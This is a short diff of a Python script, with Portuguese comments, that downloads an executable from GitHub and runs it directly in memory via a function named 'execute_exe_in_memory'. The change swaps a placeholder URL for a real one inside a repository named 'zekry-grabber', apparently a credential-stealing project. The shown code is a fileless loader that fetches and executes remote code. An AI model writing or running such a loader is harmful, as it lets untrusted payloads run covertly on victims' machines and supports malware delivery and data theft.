@@ -29,8 +29,7 @@ def execute_exe_in_memory(exe_data):
 
     print(f"Arquivo EXE carregado na memória em {hex(exec_memory)}")
 
-# URL do arquivo EXE no GitHub (use o caminho raw)
-github_url = "https://raw.githubusercontent.com/usuario/repositorio/branch/caminho/para/arquivo.exe"
+github_url = "https://github.com/pedrorichil/zekry-grabber/raw/refs/heads/main/tools/upx.exe"
 
 if __name__ == "__main__":
     exe_data = download_exe_from_github(github_url)
